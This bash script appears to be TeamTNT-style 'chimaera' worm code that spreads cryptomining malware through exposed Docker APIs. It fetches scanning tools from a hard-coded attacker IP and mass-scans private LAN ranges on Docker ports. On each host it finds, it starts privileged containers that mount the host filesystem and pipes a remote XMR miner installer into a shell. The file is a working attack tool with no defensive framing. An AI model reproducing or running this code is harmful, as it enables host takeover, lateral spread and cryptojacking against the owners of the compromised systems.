#!/bin/bash

# wget -O - http://45.9.148.35/chimaera/sh/spread_docker_local.sh | bash


clear
RATE_TO_SCAN=500000
SOURCE_URL="http://45.9.148.35"

PWNTAINER=$(curl -s http://45.9.148.35/chimaera/data/docker.container.local.spread.txt)
PWNWWWLNK="http://45.9.148.35/chimaera/sh/setup_xmr.sh"

LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")

PACK_ARRAY=("wget" "curl" "jq" "bash" "masscan" "gcc" "make" "libpcap-dev" "docker.io" "docker" "docker-ce")
TIME1OUT="120"
TIME2OUT="240"
NORMAL='\033[0;39m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'



function init_main(){
if [ -f "/var/tmp/.tnt.docker.lock" ];then echo "spreading is running!" ; exit ; fi
set_lock
setup_this_spreader
check_spreader_setup
feed_the_ranges
remove_lock
}


function remove_lock(){
rm -f /var/tmp/.tnt.docker.lock
}

function set_lock(){
mkdir -p /var/tmp/ 2>/dev/null
touch /var/tmp/.tnt.docker.lock
}



function setup_docker(){
if type yum 2>/dev/null 1>/dev/null; then
yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine
yum install -y yum-utils
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo


https://download.docker.com/linux/centos/8/x86_64/stable/Packages/docker-ce-20.10.4-3.el8.x86_64.rpm



fi



}

function setup_this_spreader(){
echo "start setup"
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; fi

for SET_PACK in ${PACK_ARRAY[@]} ; do clear
if type apk 2>/dev/null 1>/dev/null; then apk add $SET_PACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get install -y $SET_PACK 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum install -y $SET_PACK 2>/dev/null 1>/dev/null ; fi ; done

if [ ! -f "/usr/bin/zgrab" ];then wget -q $SOURCE_URL/chimaera/bin/x86_64/zgrab -O /usr/bin/zgrab && chmod +x /usr/bin/zgrab ; fi

if ! type masscan 2>/dev/null 1>/dev/null; then wget -q $SOURCE_URL/chimaera/bin/mass.tar.gz -O /var/tmp/mass.tar.gz
tar xvf /var/tmp/mass.tar.gz -C /var/tmp/ 2>/dev/null 1>/dev/null && cd /var/tmp/mass/ && rm -f /var/tmp/mass.tar.gz 2>/dev/null 1>/dev/null
make 2>/dev/null 1>/dev/null && cp bin/masscan /usr/bin/masscan 2>/dev/null 1>/dev/null && chmod +x /usr/bin/masscan 2>/dev/null 1>/dev/null
make install 2>/dev/null 1>/dev/null && cd / 2>/dev/null 1>/dev/null && rm -fr /var/tmp/mass/ 2>/dev/null 1>/dev/null ; fi

if ! type docker 2>/dev/null 1>/dev/null; then curl -sLk https://get.docker.com | bash ; fi
}


function check_spreader_setup(){
clear ; echo "check setup" ; sleep 2 ; clear
TOOLS_ARRAY=("wget" "curl" "docker" "masscan" "jq" "zgrab")
for CHECKTOOL in ${TOOLS_ARRAY[@]} ; do
if type $CHECKTOOL 2>/dev/null 1>/dev/null; then 
echo -e "$GREEN FOUND: $CHECKTOOL Install OKAY! $NORMAL" ; else
echo -e "$RED MISSING: $CHECKTOOL Install FAIL! $NORMAL" ; exit ; fi
done
}



dAPIpwn(){
range=$1
port=$2
rate=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan --router-mac 66-55-44-33-22-11 $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for ipaddy in ${!rndstr}; do
timeout -s SIGKILL 120 docker -H $TARGET run -d --net host --restart always --privileged --name dockerlan -v /:/host $PWNTAINER & 
timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged -v /:/mnt alpine chroot sh -c 'apk update; apk add bash curl wget; apt update; apt install -y  bash curl wget; yum install -y  bash curl wget; wget -q -O - $PWNWWWLNK | sh || curl -s $PWNWWWLNK | sh' &
done
}

function feed_the_ranges(){
clear ; echo "scanne local range" ; sleep 2 ; clear
for LRANGE in ${LAN_RANGES[@]}; do 
dAPIpwn $LRANGE 2375 $RATE_TO_SCAN
dAPIpwn $LRANGE 2376 $RATE_TO_SCAN
dAPIpwn $LRANGE 2377 $RATE_TO_SCAN
dAPIpwn $LRANGE 4244 $RATE_TO_SCAN
dAPIpwn $LRANGE 4243 $RATE_TO_SCAN
done 
}


init_main
